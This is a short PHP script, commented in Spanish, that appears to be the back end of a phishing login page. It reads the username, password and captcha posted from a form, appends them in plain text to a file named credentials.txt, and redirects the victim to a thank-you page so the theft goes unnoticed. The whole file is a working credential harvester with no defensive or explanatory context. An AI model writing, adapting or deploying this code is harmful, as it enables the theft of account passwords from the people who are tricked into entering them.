<?php
// Archivo donde se guardarán las credenciales
$file = "credentials.txt";

// Capturar los datos enviados desde el formulario
$username = $_POST['username'];
$password = $_POST['password'];
$captcha = $_POST['captcha'];

// Formatear los datos para el archivo de texto
$data = "Username: " . $username . " | Password: " . $password . " | Captcha: " . $captcha . "\n";

// Guardar los datos en el archivo
file_put_contents($file, $data, FILE_APPEND);

// Redirigir al usuario a una página de agradecimiento
header("Location: thankyou.html");
exit();
?>


